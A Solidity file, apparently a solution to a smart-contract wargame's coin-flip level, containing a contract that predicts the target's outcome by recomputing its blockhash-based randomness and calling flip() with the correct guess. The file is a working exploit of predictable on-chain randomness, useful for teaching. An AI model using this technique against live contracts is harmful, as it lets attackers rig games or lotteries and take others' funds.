// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface ICoinFlipChallenge {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    ICoinFlipChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = ICoinFlipChallenge(challengeAddress);
    }

    function attack() external payable {
        // simulate the same what the challenge contract does
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue
            / 57_896_044_618_658_097_711_785_492_504_343_953_926_634_992_332_820_282_019_728_792_003_956_564_819_968;
        bool side = coinFlip == 1 ? true : false;

        // call challenge contract with same guess
        challenge.flip(side);
    }

    fallback() external payable { }
}
